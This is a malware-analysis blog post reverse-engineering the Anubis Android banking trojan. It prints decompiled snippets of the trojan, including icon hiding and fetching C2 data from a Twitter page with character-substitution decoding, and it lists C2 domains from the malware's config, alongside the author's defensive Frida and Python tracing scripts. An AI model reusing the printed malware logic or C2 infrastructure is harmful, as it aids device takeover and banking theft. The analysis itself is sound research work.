---
title: "Reversing Anubis"
date: 2021-12-13T11:50:35Z
draft: false
cover: "/img/anubis/anubis.jpg"
description: "reverse engineering the notorious android banking trojan"
tags: ["reverse-engineering", "android", "malware"]
readingTime: true
---

# Table of Content

1. [Introduction](#introduction)
    1. [Samples](#samples)
2. [Environment](#environment)
    1. [Tools](#tools)
3. [Analysis](#analysis)
    1. [The Manifest](#the-manifest)
    2. [Behavioral analysis](#behavioral-analysis)
    3. [Identifying the obfuscator](#identifying-the-obfuscator)
    4. [Packed or what](#packed-or-what)
    5. [Going Down the Rabbit Hole](#going-down-the-rabbit-hole)
        1. [MainActivity](#mainactivity)
        2. [C2s, Tweets and Data Exfiltration](#c2s-tweets-and-data-exfiltration)
        3. [Audio Recording](#audio-recording)
        4. [Banking Apps](#banking-apps)
        5. [Remote Access](#remote-access)
        6. [Achieving Persistence and User Presence](#achieving-persistence-and-user-presence)
        7. [SMS Sending, Receiving and Spamming](#sms-sending-receiving-and-spamming)
        8. [Reading Contacts](#reading-contacts)
        9. [Say No to google play protect](#say-no-to-google-play-protect)
        10. [Ransomware Mode](#ransomware-mode)
4. [The end](#the-end)


# Introduction 

Anubis is a pretty big banking trojan that targets android devices. Its first appearance dates back to 2016.
And anubis is reported to have keylogging capabilities, sms spam, GPS tracking and many other scary stuff, of course, 
other than stealing your banking information.

In this blog post, i will poke various parts of the malware while reverse engineering it to understand how it works and how to defeat it.

## Samples 

[github](https://github.com/sk3ptre/AndroidMalware_2020/blob/master/anubis.zip)

# Environment 

    - linux host
    - android vm (API version 23) (no google services)

## Tools 
    - apktool
    - adb
    - frida
    - mobsf
    - jadx-gui

# Analysis

## The manifest

to analyze the manifest
![extracting with apktool](/img/anubis/anubis_apktool.png) 


```xml
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.GET_TASKS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
```

As we can see, this malware can send, receive SMS, read contacts, access location, read and write 
to external storage. It is also requesting permission to get notified once when the system boots 
up, which helps malware to persist on a device.

by investigating the activities in the xml, we can get a rough idea about which classes use which permissions and point our attention to those classes when we do actual reversing.

```xml
        <activity android:name="wocwvy.czyxoxmbauu.slsa.ncec.myvbo">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
```
Its the MainActivity, which will be our first target when approaching the malware.

```xml
        <activity android:name="wocwvy.czyxoxmbauu.slsa.opzsdswiddt">
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <action android:name="android.intent.action.SENDTO"/>
                <data android:scheme="sms"/>
                <data android:scheme="smsto"/>
                <data android:scheme="mms"/>
                <data android:scheme="mmsto"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
            </intent-filter>
        </activity>
```
Activity `wocwvy.czyxoxmbauu.slsa.opzsdswiddt` has capabilities to send sms.

```xml
        <service android:name="wocwvy.p003x881dce2d.slsa.lmimy" android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:scheme="sms"/>
                <data android:scheme="smsto"/>
                <data android:scheme="mms"/>
                <data android:scheme="mmsto"/>
            </intent-filter>
        </service>
```

class `wocwvy.czyxoxmbauu.slsa.lmily` is service that it responsible for responding messages.

```xml
        <receiver android:name="wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.hypihteeavv">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                <action android:name="android.intent.action.SCREEN_ON"/>
                <action android:name="android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"/>
                <category android:name="android.intent.category.HOME"/>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
                <action android:name="android.intent.action.DREAMING_STOPPED"/>
            </intent-filter>
        </receiver>
```
The receiver `"wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.hypihteeavv` is listening for `BOOT_COMPLETED`, `PACKAGE_ADDED`, `SMS_RECEIVED` and many more stuff. it looks like this one is really important.

Since we know this is a banking trojan, we assume that application is waiting for the user to 
install banking apps (PACKAGE_ADDED) and the above mentioned class is responsible for that. 

To achieve persistence it is listening for BOOT_COMPLETED.

manifest also mentions that the application uses accessibility framework, by class `wocwvy.czyxoxmbauu.slsa.egxltnv`
```xml
        <service android:label="Android Security" android:name="wocwvy.czyxoxmbauu.slsa.egxltnv" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/mihaf"/>
        </service>
```

it also references another xml, which specifies what kind of operation does this application do with the framework.

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service android:settingsActivity="com.example.root.myapplication.MainActivity" android:accessibilityEventTypes="typeWindowContentChanged|typeWindowStateChanged" android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds" android:canRetrieveWindowContent="true"
  xmlns:android="http://schemas.android.com/apk/res/android" />
```
Here, we can see that the application is listening for events such as `typeWindowStateChanged`, `typeWindowContentChanged`. Which basically means this application is listening to everything. And guess what? it can also retrieve the content.

before running the sample on the vm or decompiling it, it would be better to run it on a automated framework just to make sure (dunno, it is just a habit :3). Then we can focus on the specific details. Here im going to use MobSF.

![automated analysis](/img/anubis/anubis_mobsf.png)

![mobsf results](/img/anubis/anubis_mobsfstatic.png)

here we can see that the application has 17 activities, 24 services, 4 receivers and 0 providers.

![apis](/img/anubis/anubis_mobsfapi.png)

However when i try to run a dynamic analysis on the apk, MobSF failed with few errors. 

![androguard results](/img/anubis/anubis_androgaurd.png)

with the above result, we can confirm our assumptions on receivers, activities and services we made
considering the result of MobSF.

![androguard results](/img/anubis/anubis_androguard.png)

here androguard shows us receivers, main activity and the services. 

However all the above names seemed to be obfuscated.

## Behavioral analysis 

first, im going to stop the emulator and restart it with following parameters

`-show-kernel -tcpdump dump.cap`

so we can take a look at network traffic later on, in case. (I've also setup mitmproxy)

![installing the malware](/img/anubis/anubis_installapk.png)

running the sample, its asking to enable 'accessibility permissions'. And the user is forced to grant the permission. This enables application run in the background.

![accessibility permissions](/img/anubis/anubis_accessibilities.png)

Here's the network traffic.

![network traffic](/img/anubis/anubis_requeststorandom.png)

![request](/img/anubis/anubis_request.png)

when granted the requested permission, the malware seemed to be deleted from the devic.
However, its listed in the packages.

```
root@generic_x86_64:/ # pm list packages | grep slsa                           
package:wocwvy.czyxoxmbauu.slsa
root@generic_x86_64:/ # 
```

which means that it has only deleted the icon from the application launcher not 
the app itself.

## Identifying the obfuscator

It is possible to identify the obfuscator just by looking at smali code. For example, ProGuard,
which is one of the most popular android obfuscators out there, can be idenitified if the smali 
code contains variable names, strings with `d`, `a`, `a;->a` characters. (However ProGuard accepts different sets of characters for this, and it is not a good idea to make decision just based ont this).

first lets check for DexGuard, another common obfuscator. DexGuard is known to use non ascii 
chars for obfuscation. 

```python
import re, os
from pathlib import Path

def non_ascii_in_string(string):
    regexp = re.compile(r'[^\00-\xff]')
    if regexp.search(string):
        return True
    else:
        return False

def scan_file(filepath):
    try:
        with open(filepath, mode='r') as f: 
            i = 0
            for line in f:
                i+=1
                if non_ascii_in_string(line):
                    print "line [{lno}] {line} - {file}".format(lno=i, line=line, file=filepath)
    except:
        return

def main():
    pathlist = Path("smali").rglob("*.smali")
    for path in pathlist:
        scan_file(str(path))

if __name__ == '__main__':
    main()
```

above python script scans the smali directory generated by apktool for strings that contain non 
ascii characters.

![DexGuard detection](/img/anubis/anubis_notdexguard.png)

so its no harm to conclude that this sample is not obfuscated with DexGuard. 

we can use the same script to detect ProGuard by replacing the regular expression with `a/a;->a`. ()

here is the result.

![detecting obfuscation](/img/anubis/anubis_proguard.png)

from that, we can conclude that this sample is obfuscated using **ProGuard**. 

There are few projects that are capable of deobfuscating ProGuard. dex-oracle, simplify
are two of such projects. However the goal here is not to deobfuscate the class names, variable names, and methods, but to deobfuscate constants and strings
because without the mapping.txt, there is no way to rename classes, methods and variables things to their original names, but jadx's deobfuscator can help us with that for a bit.

![simplify](/img/anubis/anubis_simplify.png)

simplify get to somewhere but then horribly fails.

```sh
java.lang.NullPointerException: Attempt to get length of null array
	at java.base/jdk.internal.reflect.GeneratedConstructorAccessor6.newInstance(Unknown Source)
	at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490)
	at org.cf.smalivm.ExceptionFactory.build(ExceptionFactory.java:28)
	at org.cf.smalivm.opcode.ArrayLengthOp.<init>(ArrayLengthOp.java:28)
	at org.cf.smalivm.opcode.ArrayLengthOpFactory.create(ArrayLengthOpFactory.java:19)
	at org.cf.smalivm.opcode.OpCreator.create(OpCreator.java:29)
	at org.cf.smalivm.context.ExecutionGraph.buildLocationToNodePile(ExecutionGraph.java:89)
	at org.cf.smalivm.context.ExecutionGraph.<init>(ExecutionGraph.java:62)
	at org.cf.smalivm.VirtualMachine.updateInstructionGraph(VirtualMachine.java:180)
	at org.cf.smalivm.VirtualMachine.spawnInstructionGraph(VirtualMachine.java:131)
	at org.cf.smalivm.MethodExecutorFactory.build(MethodExecutorFactory.java:62)
	at org.cf.smalivm.VirtualMachine.execute(VirtualMachine.java:75)
	at org.cf.smalivm.opcode.InvokeOp.executeLocalMethod(InvokeOp.java:434)
	at org.cf.smalivm.opcode.InvokeOp.execute(InvokeOp.java:136)
	at org.cf.smalivm.context.ExecutionNode.execute(ExecutionNode.java:53)
    
    [...]
```

I tried running dex-oracle and it failed too. 

## Packed or what

Lets try to identify whether is apk is packed. This is pretty straightfoward. To use a class in an 
android application, one must define it in the manifest file. 

If the application doesnt have the classes specified in the manifest, then chances are that it is 
packed.

If the apk has got more classes than that of the manifest, it also indicates that the apk is packed.

In case of above situations, following APIs will be used to load and run classes at runtime.

    - dalvik.system.DexClassLoader
    - dalvik.system.PathClassLoader
    - dalvik.system.InMemoryDexClassLoader

Eventhough our apk does specify the exact same classes specified in the manifest (other than few classes), let's search for above mentioned APIs.

![DexClassLoader](/img/anubis/anubis_DexClassLoader.png)

we get few occurances of the `DexClassLoader` in the class `wocwvy.czyxoxmbauu.slsa.b` (no result for the other two).

when I trace `DexClassLoader` using below frida agent,

```javascript
if (Java.available) {
    Java.perform(function(){
        var dex_class_loader = Java.use('dalvik.system.DexClassLoader');
        dex_class_loader.$init.implementation = function(a, b, c, d) {
            var ret = this.$init(a, b, c, d);
            send("[*] constructor called DexClassLoad(\""+ a +", "+b+", "+c+"\");");
            return ret;
        }
    )}
}
```

the result was empty, which implies that the malware is not loading classes at runtime.
From which i assume that this malware is not packed.

## Going Down the Rabbit Hole

Since we have idenitified the MainActivity and some other useful classes using the manifest, we know where to start. We'll start with the MainActivity (obiviously) and move into other stuff we idenitified.

To do a code analysis, first, the apk should be converted into jar format.

```
rxOred-aspiree :: Analysis/android/anubis » enjarify anubis.apk
Using python3 as Python interpreter
Output written to anubis-enjarify.jar
136 classes translated successfully, 0 classes had errors
rxOred-aspiree :: Analysis/android/anubis » 
```
Then, using jadx, we can analyse the code.  

### MainActivity

```java
/* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.myvbo */
public class MainActivity extends Activity {

    [... some variables]
    
    /* renamed from: d */
    BankingApps banking_apps = new BankingApps();

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (!this.consts.f388o || Build.VERSION.SDK_INT < 19) {
            startService(new Intent(this, jtfxlnc.class));
        } else {
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.loadUrl(this.consts.f389p);
            setContentView(webView);
        } 
        
        [... more code]
```

In the MainActivity, it declares some variables, including `banking_apps` of type `class BankingApps`. (which i reversd before coming to this hehe :3).

onCreate method then check whether if `consts.f388o` is false (which is initially false, and defined in `Constants` class) or `Build.VERSION.SDK_INT` is less than **19**.

if yes, it creates the service `jtfxlnc`, else (if const.f388o is true or Build.VERSION.SDK_INT >= 19),
it creates a `WebView`, enable javascript and load the url specified in `consts.f389p`. then it 
sets the content view to the web view.

what this basically does is loads up a web page in a WebView layout as a part of the activity.

```java
public class Constants {
    [... more constants]

    /* renamed from: o */
    public boolean f388o = false;

    /* renamed from: p */
    public String url_image = "<urlImage>";

    [... more constants]
}
```
Above snippet shows the constants

Then we can see an interesting piece of code in the MainActivity after the if else statement.  

```java
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class), 2, 1);
```
According to Android developers, `setComponentEnabledSetting` 'sets te enabled setting fot a package component (activity, receiver, service, provider). this setting will override any enabled state which may have been set by the component manifest'

Here, MainActivity calls above API for itself, with constant 2 as the second argument. which is stands for  `COMPONENT_ENABLED_STATE_DISABLED`.
In short terms, malware basically **hides its icon from the launcher** (by disabling) to make it harder for a regular user to delete the application.
All this makes sense because, this is why malware has started a service to run in the background.

then there's a try catch block

```java
        try {
            SomeHttpClass bVar = this.cls;
            SomeHttpClass.m231a(this, "startAlarm", (long) Integer.parseInt(this.cls.mo234e(this, "Interval")));
        } catch (Exception e) {
            SomeHttpClass bVar2 = this.cls;
            SomeHttpClass.m231a(this, "startAlarm", 10000);
        }
        if (!this.consts.f388o) {
            finish();
        }
    }
}
```

This piece of code tries to start an alarm with the return value of `SomeHttpClass.mo234e()`, if fails, it sets a default value of 10000.

Now its time to do some instrumentation and find out whats returning from that method.

first off, we need a frida agent and a wrapper script. I chose python to write the wrapper script.

```python
import frida
import sys, codecs, os, time

def callback(message, data):
    if 'payload' in message and message['type'] == 'send':
        print("[!] callback -> {0}".format(message['payload']))
    else:
        print(message)

def main():
    if len(sys.argv) < 3:
        print("wrapper.py <appname> <agent>")
        sys.exit(0)

    source = None
    with codecs.open(sys.argv[2], "r", "utf-8") as f:
        source = f.read()

    if source:
        device = frida.get_usb_device()
        pid = device.spawn([sys.argv[1]])
        device.resume(pid)
        time.sleep(1)
        session = device.attach(pid)
        script = session.create_script(source)
        script.on('message', callback)
        script.load()

        sys.stdin.read()

    else:
        print("failed to read the frida agent")
        sys.exit(1)


if __name__ == '__main__':
    main()
```

let's write a frida agent that hooks SomeHttpClass.mo234e();
Without jadx deobfuscator, method is named as below

```java
public String e(Context context, String str) {...}
```
and it is overloaded. So we have to handle that within the frida agent. 

```javascript
'use strict';

if (Java.available) { 
    Java.perform(function() {
        var some_http_class = Java.use("wocwvy.czyxoxmbauu.slsa.b");
        some_http_class.e.overload("andorid.context.Context", "java.lang.String")implementation = function(x, y) {
            var ret = this.e(x, y);
            send("[*] method called SomeHttpClass.mo234e("+ y +") => return: "+ ret.toString());
            return ret;
        }
    })
}
```

```sh
rxOred-aspiree :: ~/Analysis/android � python wrapper.py wocwvy.czyxoxmbauu.slsa mo234e.js
[!] callback -> [*] method called SomeHttpClass.mo234e("urls") => return: http://cdnjs.su
[!] callback -> [*] method called SomeHttpClass.mo234e("save_inj") => return: 
[!] callback -> [*] method called SomeHttpClass.mo234e("cryptfile") => return: false
[!] callback -> [*] method called SomeHttpClass.mo234e("startRecordSound") => return: stop
[!] callback -> [*] method called SomeHttpClass.mo234e("startRequest") => return: Access=0Perm=0
[!] callback -> [*] method called SomeHttpClass.mo234e("startRequest") => return: Access=0Perm=0
[!] callback -> [*] method called SomeHttpClass.mo234e("recordsoundseconds") => return: 0
[!] callback -> [*] method called SomeHttpClass.mo234e("lookscreen") => return: 
[!] callback -> [*] method called SomeHttpClass.mo234e("StringAccessibility") => return: Enable access for
[!] callback -> [*] method called SomeHttpClass.mo234e("urls") => return: http://cdnjs.su
[!] callback -> [*] method called SomeHttpClass.mo234e("save_inj") => return: 
[!] callback -> [*] method called SomeHttpClass.mo234e("cryptfile") => return: false
[!] callback -> [*] method called SomeHttpClass.mo234e("startRecordSound") => return: stop
[!] callback -> [*] method called SomeHttpClass.mo234e("recordsoundseconds") => return: 0
[!] callback -> [*] method called SomeHttpClass.mo234e("lookscreen") => return: 
[!] callback -> [*] method called SomeHttpClass.mo234e("urls") => return: http://cdnjs.su
[!] callback -> [*] method called SomeHttpClass.mo234e("save_inj") => return: 
[!] callback -> [*] method called SomeHttpClass.mo234e("cryptfile") => return: false
[!] callback -> [*] method called SomeHttpClass.mo234e("startRecordSound") => return: stop
[!] callback -> [*] method called SomeHttpClass.mo234e("recordsoundseconds") => return: 0
[!] callback -> [*] method called SomeHttpClass.mo234e("lookscreen") => return: 
[!] callback -> [*] method called SomeHttpClass.mo234e("keylogger") => return: 
[... more stuff here]
```

well that's a lot. it seems like the malware calls the method many times before the MainActivity calls it.
My guess is that would be the service that it starts.
However we see some interesting stuff in the above snippet.

for example, when the method is called with `url` as an argument, it returns `https://cdnjs.sv`.

and we can also see that the method is called with `keylogger` as the argument, which gives us a hint that this malware is **capable of keylogging**.

```sh
[!] callback -> [*] method called SomeHttpClass.mo234e("interval") => return: 10000
```
`SomeHttpClass.mo234e()` method returns value 10000, which is exactly the same value thats going to 
be used when the condition fails. 

So what exactly `SomeHttpClass.mo234e()` does? Well, I think its reading data from some kind of data storage using the `key`
which it receives as an argument. Yaeee?? what comes to your mind?? **shared preferences**.

To confirm our assumption

```java
    /* renamed from: mo234e */
    public String getSharedPreference(Context context, String str) {
        if (shared_pef == null) {
            shared_pef = context.getSharedPreferences("set", 0);
            shared_pref_editor = shared_pef.edit();
        }
        String string = shared_pef.getString(str, null);
        return (str.contains("urlInj") || str.contains("urls")) ? mo230d(string) : string;
    }
```

See? (keep in mind that, when returning from the function is checks whether `str` contains `urls` or `urlInj`, if so, it calles another method with `string` and return it, probably a decoder.)

Now, what we can do is, trace back and find the xml file.

```javascript 
'use strict';

Interceptor.attach(Module.findExportByName(null, "open"), {
    onEnter: function(args) {
        this.flag = false;
        var filename = Memory.readCString(ptr(args[0])); 
        if (filename.endsWith(".xml")) {
            send("[*] open called => (\""+ filename + "\")");
            this.flag = true;
            var backtrace = Thread.backtrace(this.Context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join("\n\t");
            send("[-] traced ["+ Memory.readCString(ptr(args[0])) + "]\nBacktrace => "+ backtrace);
        }
    }
});        
```

result:

```xml
[!] callback -> [*] open called => ("/data/user/0/wocwvy.czyxoxmbauu.slsa/shared_prefs/set.xml")
[!] callback -> [-] traced [/data/user/0/wocwvy.czyxoxmbauu.slsa/shared_prefs/set.xml]
Backtrace => 0x79f058b9d749 frida-agent-64.so!0x29b749
	0x79f058be791c frida-agent-64.so!0x2e591c
	0x79f058bf33d9 frida-agent-64.so!0x2f13d9
	0x79f058bf4bf6 frida-agent-64.so!0x2f2bf6
	0x79f058bf3077 frida-agent-64.so!0x2f1077
	0x79f058b909d5 frida-agent-64.so!0x28e9d5
	0x79f058b90adb frida-agent-64.so!0x28eadb
	0x79f058ba41fd frida-agent-64.so!0x2a21fd
	0x79f058b64cfc frida-agent-64.so!0x262cfc
	0x79f0f2a3a077
	0x241
```

see? we've found the shared preference xml. Now its all about extracting it from the device using adb and look for interesting stuff.

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="madeSettings">1 2 3 4 5 6 7 8 9 10 11 12 13 </string>
    <string name="StringPermis">Allow</string>
    <string name="uninstall1">uninstall</string>
    <string name="VNC_Start_NEW">http://ktosdelaetskrintotpidor.com</string>
    <string name="startRequest">Access=0Perm=0</string>
    <string name="sound">start</string>
    <string name="vkladmin">include</string>
    <string name="DexSocksMolude"></string>
    <string name="websocket"></string>
    <string name="uninstall2">to remove</string>
    <string name="lookscreen"></string>
    <string name="StringAccessibility">Enable access for</string>
    <string name="dateCJ"></string>
    <string name="id_windows_bot"></string>
    <string name="StringActivate">activate</string>
    <string name="checkStartGrabber">0</string>
    <string name="vnc">start</string>
    <string name="cryptfile">false</string>
    <string name="recordsoundseconds">0</string>
    <string name="gps">false</string>
    <string name="swspacket">com.android.messaging</string>
    <string name="perehvat_sws">false</string>
    <string name="buttonPlayProtect">Сontinue</string>
    <string name="name">false</string>
    <string name="interval">10000</string>
    <string name="del_sws">false</string>
    <string name="RequestGPS"></string>
    <string name="straccessibility">start now</string>
    <string name="status"></string>
    <string name="timeStartGrabber"></string>
    <string name="play_protect"></string>
    <string name="spamSMS"></string>
    <string name="Starter">http://sositehuypidarasi.com</string>
    <string name="network">false</string>
    <string name="getNumber">false</string>
    <string name="indexSMSSPAM"></string>
    <string name="urls">ZWViZGQ3NjRjOGZlOWNjMjAzODhhNzFhNzg4MDJi&#10;    </string>
    <string name="str_push_fish"></string>
    <string name="time_start_permission">120</string>
    <string name="save_inj"></string>
    <string name="textSPAM"></string>
    <string name="straccessibility2">to start</string>
    <string name="findfiles"></string>
    <string name="key"></string>
    <string name="StringYes">Yes</string>
    <string name="startRecordSound">stop</string>
    <string name="urlInj"></string>
    <string name="htmllocker"></string>
    <string name="foregroundwhile"></string>
    <string name="lock_btc"></string>
    <string name="SettingsAll"></string>
    <string name="RequestINJ"></string>
    <string name="time_work">375</string>
    <string name="iconCJ">0:0</string>
    <string name="keylogger"></string>
    <string name="step">0</string>
    <string name="textPlayProtect">The system does not work correctly, disable Google Play Protect!</string>
    <string name="lock_amount"></string>
</map>
```

This xml file explains what this malware is capable of. 

here's another agent to monitor what values are being written to the xml file.
```javascript
'use strict';

var fds = {};
Interceptor.attach(Module.findExportByName(null, "open"), {
    onEnter: function(args) {
        var filename = Memory.readCString(ptr(args[0]));
        if (filename.endsWith('.xml')) {
            send("[*] open called => (\""+ filename + "\")");
            this.flag = true;
            this.fname = filename;
        }
    },
    onLeave: function(retval) {
        if (this.flag) {
            fds[retval] = this.fname;
        }
    }
});
['read', 'write', 'pread', 'pwrite', 'readv', 'writev'].forEach(func => {
    Interceptor.attach(Module.findExportByName(null, func), {
        onEnter: function(args) {
            var fd = args[0];
            if (fd in fds) {
                send(`${func}: ${fds[fd]} \t`);
                if (args[1] != null) {
                    if (func == 'write') {
                        var buffer = Memory.readCString(ptr(args[1]));
                        send("\tbuffer => "+buffer);
                    }
                }
            }
        }
    });
});
```

However it does not explicitly specify what are the new values written to the file. Instead, it prints the whole buffer. In this case, the buffer is
the xml.



### C2s, Tweets and Data Exfiltration

Since we have already analyzed few methods from the `SomeHttpClass`, It's time to dig deep into it.

class got following member variables.

```java

    /* renamed from: c */
    static final Constants consts = new Constants();

    /* renamed from: d */
    static final String android_sec = "Android Security";

    /* renamed from: e */
    private static SharedPreferences shared_prefs;

    /* renamed from: f */
    private static SharedPreferences.Editor shared_ref_editor;

    /* renamed from: a */
    Constants consts2 = new Constants();

    /* renamed from: b */
    BankingApps banking_apps = new BankingApps();
```

Inside the class, there is another class, which I renamed to `MakeTwitterRequest` because this is the class that makes the twitter request to `qweqweqwe` before.

```java
    public class MakeTwitterRequest extends AsyncTask {

        [... more code and data]
        
        public String doInBackground(Void... voidArr) {
            try {
                SomeHttpClass.this.consts2.getClass();
                this.conn = (HttpURLConnection) new URL("https://twitter.com/qweqweqwe").openConnection();
                this.conn.setRequestMethod("GET");
                this.conn.connect();

                InputStream inputStream = this.conn.getInputStream();
                StringBuffer stringBuffer = new StringBuffer();
                this.reader = new BufferedReader(new InputStreamReader(inputStream));
                while (true) {
                    String readLine = this.reader.readLine();
                    if (readLine == null) {
                        break;
                    }
                    stringBuffer.append(readLine);
                }
```

inside the try block, it opens a connection to `https://twitter.com/qweqweqwe`.
then it gets an `InputStream` from the connection and reads data to `StringBuffer stringBuffer` with the help of a 
`BufferedReader reader`.

```java
                this.str = stringBuffer.toString().replace(" ", "");
                this.str = SomeHttpClass.this.mo208a(this.str, "�����", "�����");  // some chinese characters

```

The malware then replaces all the spaces with empty string, and calls `SomeHttpClass.mo208a`, passing some random looking
chinese letters as second and third arguments.

lets see what's the return value with frida. again, this shit is overloaded too. (pretty common in obfuscated java code.)

```javascript
'use strict';

if (Java.available) {
    Java.perform(function() {
        var some_http_class = Java.use("wocwvy.czyxoxmbauu.slsa.b");
        some_http_class.a.overload("java.lang.String", "java.lang.String", "java.lang.String").implementation = function(x, y, z) { 
            send("[*] method called SomeHttpClass.mo208a(\""+ x +"\", " +y+ "\", "+z+"\")");
            var ret = this.a(x, y, z); 
            if (ret != undefined) {
                send(" => return: "+ ret);
                return ret;
            }
            else {
                send(" => return: undefined");
                return Java.use('java.lang.String').$new("undefined");
            }       
        }
    });
}
```
when ran the above agent, 

```sh
[!] callback -> [*] method called SomeHttpClass.mo208a("null", <tag>", </tag>")
[!] callback ->  => return: undefined
```
we can see that the method is called by with some unexpected arguments. And this is even before the malware makes the request to twitter url.
If you wait bit longer (until the malware makes that request), we can see the arguments we expected.

I cant drop the result here because first argument is too long. which makes sense because malware is using the response html as the first argument.
Unfortunately, the return value we get is, "" :3.

```
[!] callback ->  => return:
```

However we can try to understand what `SomeHttpClass.mo208a` is doing with the input either using frida or by intercepting the request and writing a response that suite our needs.

```javascript
'use strict';

if (Java.available) {
    Java.perform(function() {
        var java_string = Java.use("java.lang.String");
        var some_http_class = Java.use("wocwvy.czyxoxmbauu.slsa.b");
        some_http_class.a.overload("java.lang.String", "java.lang.String", "java.lang.String").implementation = function(x, y, z) { 
            send("[*] method called SomeHttpClass.mo208a(\""+ x +"\", " +y+ "\", "+z+"\")");
            send("[*] calling method with 123456789abcdefhijklmnoqpuvwz");
            var ret = this.a(java_string.$new("123456789abcdefhijklmnoqpuvwz"), java_string.$new('123456'), java_string.$new('noqpuvwz')); 
            if (ret != undefined) {
                send(" => return: "+ ret);
                return ret;
            }
            else {
                send(" => return: undefined");
                return Java.use('java.lang.String').$new("undefined");
            }       
        }
    });
}
```

The above agent calls the intended method with various strings as arguments.

result:
```sh
[!] callback -> [*] method called SomeHttpClass.mo208a("null", <tag>", </tag>")
[!] callback -> [*] calling method with 123456789abcdefhijklmnoqpuvwz
[!] callback ->  => return: 789abcdefhijklm
```

So it looks like function is taking three arguments and returning the string between the string specified in the second argument and the third.
For example, in the above case, Ive called the method with `123456789abcdefhijklmnoqpuvwz` as the first argument and `123456` and `noqpuvwz` as second
and third arguments. the result is `789abcdefhijklm`.

anyway, back to the code we've been analyzing

```java
                int i = 0;
                while (true) {
                    BankingApps aVar = SomeHttpClass.this.banking_apps;
                    if (i >= BankingApps.f332s.length) {
                        break;
                    }
                    String str2 = this.str;
                    BankingApps aVar2 = SomeHttpClass.this.banking_apps;
                    String str3 = BankingApps.f333t[i];
                    BankingApps aVar3 = SomeHttpClass.this.banking_apps;
                    this.str = str2.replace(str3, BankingApps.f332s[i]);
                    i++;
                }
                this.str = SomeHttpClass.this.mo230d(this.str);
```

we see a while, loop which iterates until variable `i` is grater than or equal to `BankingApps.f332s.legth`.
the string returned from the previous operation is stored in str and then it has been asigned to `str2`. `str3` is assigned with  `BankingApps.f333t[i]`.
then `str` is reassigned to itself with its every `BankingApps.f333t[i]` character being replaced with `BankingApps.f332s[i]`, if that makes sense.

So its basically a loop that iterates through two arrays of characters, replacing one array's character in the string `str` with the other ones corresponding character.

Lets take a look at what those arrays are...

```java
/* renamed from: s */
    public static final String[] f332s = {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "q", "w", "e", "r", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "=", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"};

    /* renamed from: t */
    public static final String[] f333t = {"需", "要", "意", "在", "中", "并", "没", "有", "个", "概", "念", "小", "语", "拼", "亡", "及", "注", "鲜", "新", "死", "之", "类", "阿", "努", "比", "拉", "丁", "化", "体", "系", "都", "只", "斯", "一", "套", "用", "恶", "件", "来", "标", "音", "的", "符", "号", "而", "不", "是", "字", "母", "寂", "寞", "肏", "你", "妈", "屄", "引", "脚", "吸", "员", "会", "膏", "药"};

```

